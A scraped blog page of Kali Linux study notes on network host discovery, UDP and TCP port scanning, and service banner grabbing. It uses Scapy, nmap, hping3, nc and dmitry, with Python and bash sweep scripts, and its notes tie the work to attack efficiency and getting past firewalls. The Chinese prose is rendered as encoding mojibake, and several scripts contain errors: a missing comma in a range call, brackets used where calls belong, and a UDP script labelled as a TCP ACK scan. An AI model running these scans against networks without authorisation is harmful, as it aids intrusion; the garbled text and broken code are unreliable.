<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">    print &quot;Usage - ./udp_scan.py [Target IP] [First IP] [Last IP] &quot;</span><br><span class="line">    print &quot;Example - ./udp_scan.py 192.168.100.1 1 200&quot;</span><br><span class="line">    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">start=int(sys.argv[2])</span><br><span class="line">end=int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">for port in range(start end):</span><br><span class="line">    a=sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    if a==None:</span><br><span class="line">      print port</span><br><span class="line">    else:</span><br><span class="line">      pass</span><br></pre></td></tr></table></figure>

<h4 id="3-ç«¯å£æ‰«æï¼ˆNmap-UDPï¼‰"><a href="#3-ç«¯å£æ‰«æï¼ˆNmap-UDPï¼‰" class="headerlink" title="3. ç«¯å£æ‰«æï¼ˆNmap-UDPï¼‰"></a>3. ç«¯å£æ‰«æï¼ˆNmap-UDPï¼‰</h4><ul>
<li>Nmap</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sUï¼ˆç«¯å£æ‰«æï¼‰ IPåœ°å€</code></strong><ul>
<li>é»˜è®¤çš„1000ä¸ªå‚æ•°ï¼ˆä¸æŒ‡å®šç«¯å£çš„æƒ…å†µä¸‹ï¼‰</li>
<li>ICMP host-unreachable</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -sU -pï¼ˆæŒ‡å®šç«¯å£ï¼‰ 53</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -iL iplist.txt -sU -pï¼ˆæŒ‡å®šç«¯å£èŒƒå›´ï¼‰ 1-200</code></strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linuxç¬”è®°(åå…­)ï¼šä¸»æœºå‘ç°--å››å±‚å‘ç°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  996 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  5 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-å‘ç°-å››å±‚å‘ç°ï¼ˆä¸å¯¹ç«¯å£çŠ¶æ€è¿›è¡Œè¯†åˆ«ï¼Œä¸»è¦æ˜¯å¯¹IPæ˜¯å¦åœ¨çº¿è¿›è¡Œè¯†åˆ«ï¼‰"><a href="#1-å‘ç°-å››å±‚å‘ç°ï¼ˆä¸å¯¹ç«¯å£çŠ¶æ€è¿›è¡Œè¯†åˆ«ï¼Œä¸»è¦æ˜¯å¯¹IPæ˜¯å¦åœ¨çº¿è¿›è¡Œè¯†åˆ«ï¼‰" class="headerlink" title="1. å‘ç°-å››å±‚å‘ç°ï¼ˆä¸å¯¹ç«¯å£çŠ¶æ€è¿›è¡Œè¯†åˆ«ï¼Œä¸»è¦æ˜¯å¯¹IPæ˜¯å¦åœ¨çº¿è¿›è¡Œè¯†åˆ«ï¼‰"></a>1. å‘ç°-å››å±‚å‘ç°ï¼ˆä¸å¯¹ç«¯å£çŠ¶æ€è¿›è¡Œè¯†åˆ«ï¼Œä¸»è¦æ˜¯å¯¹IPæ˜¯å¦åœ¨çº¿è¿›è¡Œè¯†åˆ«ï¼‰</h4><ul>
<li>ä¼˜ç‚¹<ul>
<li>å¯è·¯ç”±ä¸”ç»“æœå¯é </li>
<li>ä¸å¤ªå¯èƒ½è¢«é˜²ç«å¢™è¿‡æ»¤</li>
<li>ç”šè‡³å¯ä»¥å‘ç°æ‰€æœ‰ç«¯å£éƒ½è¢«è¿‡æ»¤çš„ä¸»æœº</li>
</ul>
</li>
<li>ç¼ºç‚¹<ul>
<li>åŸºäºçŠ¶æ€è¿‡æ»¤çš„é˜²ç«å¢™å¯èƒ½è¿‡æ»¤æ‰«æ</li>
<li>å…¨ç«¯å£æ‰«æé€Ÿåº¦æ…¢</li>
</ul>
</li>
<li>TCPï¼ˆæ­£å¸¸è¿‡ç¨‹ï¼šSYNâ€“SYN/ACKâ€“ACKï¼‰<ul>
<li>æœªç»è¯·æ±‚çš„ACKâ€“RST</li>
<li>SYNâ€“SYN/ACKã€RST</li>
</ul>
</li>
<li>UDP<ul>
<li>ICMPç«¯å£ä¸å¯è¾¾ã€ä¸€å»ä¸å¤è¿”ï¼ˆè¢«è¯†åˆ«ä¸»æœºç«¯å£æœªå¼€æ”¾UDPæœåŠ¡ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="2-å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-TCPï¼‰"><a href="#2-å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-TCPï¼‰" class="headerlink" title="2. å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-TCPï¼‰"></a>2. å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-TCPï¼‰</h4><ul>
<li>ACKâ€“TCP Portâ€“RST</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=â€IPåœ°å€â€</li>
<li>t=TCP()</li>
<li>t.flags=â€Aâ€</li>
<li>r=(i/f)</li>
<li>a=sr1(r)</li>
<li>a.display()</li>
</ul>
</li>
<li>a=sr1(IP(dst=â€IPåœ°å€â€)/TCP(dport=80,flags=â€Aâ€),timeout=1)</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./ACK_Ping.py IPç½‘æ®µ</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./ACK_Ping.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./ACK_Ping.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">    response=sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flags=&apos;A&apos;),timeout=0.1,verbose=0)</span><br><span class="line">    try:</span><br><span class="line">      if int(response[TCP].flags)==4:</span><br><span class="line">        print prefix+str(addr)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<h4 id="3-å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-UDPï¼‰"><a href="#3-å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-UDPï¼‰" class="headerlink" title="3. å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-UDPï¼‰"></a>3. å‘ç°-å››å±‚å‘ç°ï¼ˆScapy-UDPï¼‰</h4><ul>
<li>UDPâ€“UDP Portâ€“ICMP</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>u=UDP()</li>
<li>i.dst=â€IPåœ°å€â€</li>
<li>u.dport=33333</li>
<li>r=(i/u)</li>
<li>a=sr1(r,timeout=1,verbose=1)</li>
<li>a.display()</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./UDP_Ping.py IPç½‘æ®µ</code></strong>ï¼ˆUDPå‘ç°ä¸å¯é ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./UDP_Ping.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./UDP_Ping.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform a UDP ICMP scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">    response=sr1(IP(dst=prefix+str(addr))/UDP(dport=33333),timeout=0.1,verbose=0)</span><br><span class="line">    try:</span><br><span class="line">      if int(response[IP].proto)==1:</span><br><span class="line">        print prefix+str(addr)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<h4 id="4-å‘ç°-å››å±‚å‘ç°ï¼ˆNmapï¼‰"><a href="#4-å‘ç°-å››å±‚å‘ç°ï¼ˆNmapï¼‰" class="headerlink" title="4. å‘ç°-å››å±‚å‘ç°ï¼ˆNmapï¼‰"></a>4. å‘ç°-å››å±‚å‘ç°ï¼ˆNmapï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€-254 -PU53ï¼ˆå¯¹äºUDP53ç«¯å£ï¼‰-sn</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€-254 -PA80ï¼ˆå¯¹äºTCP80ç«¯å£ï¼‰-sn</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -iL iplist.txt -PA80 -sn</code></strong></li>
</ul>
<p>â–² 2019.12.3 Nmapå±€åŸŸç½‘ï¼Œæ— è®ºæ˜¯TCPè¿˜æ˜¯UDPï¼Œå‘é€çš„éƒ½æ˜¯DNSçš„åŒ…ï¼Œå±€åŸŸç½‘å†…æ˜¯å‘ç»™ç½‘å…³<br>â–² 2019.12.3 Nmapå¤–ç½‘ï¼ŒUDPæŸ¥è¯¢æ—¶å‘é€DNSåŒ…ï¼ŒTCPå‘é€TCPåŒ…</p>
<blockquote>
<pre><code>nmap IPåœ°å€ -P0 -sn Pingå±‚çš„å‘ç°
nmap IPåœ°å€ -PS -sn SCTPå‘ç°
nmap IPåœ°å€ -PE -sn ICMP echo
nmap IPåœ°å€ -PP -sn æ—¶é—´æˆ³
namp IPåœ°å€ -PM -sn å­ç½‘æ©ç å‘ç°
nmap 192.168.100.1-254 -PA80 -sn | grep &quot;Nmap&quot; | grep -v &quot;Starting&quot; | grep -v &quot;done&quot;| cut -d &quot; &quot; -f 6 | cut -d &quot;(&quot; -f 2| cut -d &quot;)&quot; -f 1 &gt; iplist.txt</code></pre></blockquote>
<h4 id="5-å‘ç°-å››å±‚å‘ç°ï¼ˆhping3ï¼‰"><a href="#5-å‘ç°-å››å±‚å‘ç°ï¼ˆhping3ï¼‰" class="headerlink" title="5. å‘ç°-å››å±‚å‘ç°ï¼ˆhping3ï¼‰"></a>5. å‘ç°-å››å±‚å‘ç°ï¼ˆhping3ï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 --udp IPåœ°å€ -c 1</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfor addr in $(seq 1 254);do hping3 --udp 1.1.1.$addr -c 1 &gt;&gt;r.txt;done</code></strong><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šgrep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./udp_hping.sh IPç½‘æ®µ</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ï¼/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./udp_hping.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./udp_hping.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an UDP scan of the 192.168.100.0/24 network and output.txt file&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    hping3 $prefix.$addr --udp -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€ -c 1</code></strong>ï¼ˆTCPï¼ŒFlag 0â€“ACKã€RSTï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./tcp_hping.sh IPç½‘æ®µ</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ï¼/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./tcp_hping.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./tcp_hping.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an TCP scan of the 192.168.100.0/24 network and output.txt file&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    hping3 $prefix.$addr -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure>


<blockquote>
<pre><code>hping3ä¸æ˜¯å‘ACKçš„TCPåŒ…ï¼Œæ˜¯flag0çš„TCPåŒ…ï¼Œéœ€è¦æ”¶å›ACKã€RSTçš„TCPåŒ…
nmapå’ŒScapyå‘çš„æ˜¯ACKçš„TCPåŒ…ï¼Œæ˜¯flag16çš„TCPåŒ…ï¼Œéœ€è¦æ”¶å›RSTçš„TCPåŒ…</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/" itemprop="url">Kali Linuxç¬”è®°(åä¹)ï¼šæœåŠ¡æ‰«æ</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1.5k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  6 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-æœåŠ¡æ‰«æï¼ˆä¸èƒ½ç®€å•é€šè¿‡ç«¯å£å·æ¥åˆ¤æ–­ç«¯å£ä¸Šçš„æœåŠ¡ï¼‰"><a href="#1-æœåŠ¡æ‰«æï¼ˆä¸èƒ½ç®€å•é€šè¿‡ç«¯å£å·æ¥åˆ¤æ–­ç«¯å£ä¸Šçš„æœåŠ¡ï¼‰" class="headerlink" title="1. æœåŠ¡æ‰«æï¼ˆä¸èƒ½ç®€å•é€šè¿‡ç«¯å£å·æ¥åˆ¤æ–­ç«¯å£ä¸Šçš„æœåŠ¡ï¼‰"></a>1. æœåŠ¡æ‰«æï¼ˆä¸èƒ½ç®€å•é€šè¿‡ç«¯å£å·æ¥åˆ¤æ–­ç«¯å£ä¸Šçš„æœåŠ¡ï¼‰</h4><ul>
<li>è¯†åˆ«å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œçš„åº”ç”¨</li>
<li>è¯†åˆ«ç›®æ ‡æ“ä½œç³»ç»Ÿ</li>
<li>æé«˜æ”»å‡»æ•ˆç‡<ul>
<li>Banneræ•è·ï¼ˆæœ€ä¸»è¦ï¼Œæœ€ç®€å•ï¼Œå‡†ç¡®æ€§ä¸é«˜ï¼‰</li>
<li>æœåŠ¡è¯†åˆ«</li>
<li>æ“ä½œç³»ç»Ÿè¯†åˆ«</li>
<li>SNMPåˆ†æï¼ˆé€šè¿‡ç³»ç»Ÿå†…éƒ¨ä¿¡æ¯æ¥è¿›è¡Œæ¢ç´¢ï¼‰</li>
<li>é˜²ç«å¢™è¯†åˆ«ï¼ˆè¯†åˆ«è¾¹ç•Œé˜²ç«å¢™ï¼Œè¿‡æ»¤æœºåˆ¶ï¼Œè¿›è¡Œç»•è¿‡ï¼‰</li>
</ul>
</li>
<li>Banner<ul>
<li>è½¯ä»¶å¼€å‘å•†</li>
<li>è½¯ä»¶åç§°</li>
<li>æœåŠ¡ç±»å‹</li>
<li>ç‰ˆæœ¬å·ï¼ˆç›´æ¥å‘ç°å·²çŸ¥çš„æ¼æ´å’Œå¼±ç‚¹ï¼‰</li>
</ul>
</li>
<li>è¿æ¥å»ºç«‹åç›´æ¥è·å–banner</li>
<li>å¦ç±»æœåŠ¡è¯†åˆ«æ–¹æ³•<ul>
<li>ç‰¹å¾è¡Œä¸ºå’Œå“åº”å­—æ®µï¼ˆæŒ‡çº¹ä¿¡æ¯ï¼‰</li>
<li>ä¸ç”¨çš„å“åº”å¯ç”¨äºè¯†åˆ«åº•å±‚æ“ä½œç³»ç»Ÿ</li>
</ul>
</li>
<li>SNMPï¼ˆé»˜è®¤å°±æ˜¯publicï¼Œå¯è¯»å¯å†™privateï¼Œpublicå¯æŸ¥çœ‹äº¤æ¢æœºä¿¡æ¯ï¼‰<ul>
<li>ç®€å•ç½‘ç»œç®¡ç†åè®®</li>
<li>Community strings</li>
<li>ä¿¡æ¯æŸ¥è¯¢æˆ–é‡æ–°é…ç½®</li>
</ul>
</li>
<li>è¯†åˆ«å’Œç»•è¿‡é˜²ç«å¢™ç­›é€‰</li>
</ul>
<h4 id="2-æœåŠ¡æ‰«æ-Banner"><a href="#2-æœåŠ¡æ‰«æ-Banner" class="headerlink" title="2. æœåŠ¡æ‰«æ-Banner"></a>2. æœåŠ¡æ‰«æ-Banner</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnc -nv IPåœ°å€ ç«¯å£å·</code></strong>ï¼ˆæŸ¥çœ‹ç«¯å£bannerä¿¡æ¯ï¼‰</li>
</ul>
<h4 id="3-æœåŠ¡æ‰«æ-Banner"><a href="#3-æœåŠ¡æ‰«æ-Banner" class="headerlink" title="3. æœåŠ¡æ‰«æ-Banner"></a>3. æœåŠ¡æ‰«æ-Banner</h4><ul>
<li>Python socketï¼ˆsocketç¼ºä¹å¯¹åº”ç”¨å±‚æ•°æ®åŒ…çš„å®šä¹‰ï¼Œæ— æ³•å»ºç«‹å®Œæ•´ä¼šè¯ï¼‰<ul>
<li>socketæ¨¡å—ç”¨äºè¿æ¥ç½‘ç»œæœåŠ¡</li>
</ul>
</li>
<li>python</li>
<li>import socket</li>
<li>banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</li>
<li>banner.connet((â€œIPåœ°å€â€,ç«¯å£å·))</li>
<li>banner.recv(4096)  ï¼ˆâ€™220(vsftp 2.3.4)\r\nâ€™ï¼‰ </li>
<li>banner.close()</li>
<li>exit()</li>
<li>Bannerä¸å…è®¸æŠ“å–ï¼Œrecvå‡½æ•°æ— è¿”å›å°†æŒ‚èµ·ï¼ï¼</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./ban_grab.py IPåœ°å€ èµ·å§‹ç«¯å£ ç»“æŸç«¯å£</code></strong>  â–²2019.12.6 æš‚æ—¶æ‰«ä¸å‡ºæœåŠ¡</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">    print &quot;Usage - ./ban_grab.py [Target IP] [First Port] [Last Port] &quot;</span><br><span class="line">    print &quot;Example - ./ban_grab.py 192.168.100.1 1 200&quot;</span><br><span class="line">    print &quot;Example will grab banners for TCP ports 1 through 100 on 192.168.100.1&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">start=int(sys.argv[2])</span><br><span class="line">end=int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">for port in range(start,end):</span><br><span class="line">    try:</span><br><span class="line">      bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">      bangrab.connect((ip,port))</span><br><span class="line">      ready=select.select((bangrab),[],[],1)</span><br><span class="line">      if ready[0]:</span><br><span class="line">        print &quot;TCP Port &quot;+str[port]+&quot;-&quot;+bangrab.recv[4096]</span><br><span class="line">        bangrab.close()</span><br><span class="line">    except:</span><br><span class="line">      pass</span><br></pre></td></tr></table></figure>

<h4 id="4-æœåŠ¡æ‰«æ-Banner"><a href="#4-æœåŠ¡æ‰«æ-Banner" class="headerlink" title="4. æœåŠ¡æ‰«æ-Banner"></a>4. æœåŠ¡æ‰«æ-Banner</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdmitry -pï¼ˆTCPæ‰«æï¼‰IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdmitry -pbï¼ˆTCPæ‰«æbannerä¿¡æ¯ï¼‰ IPåœ°å€</code></strong></li>
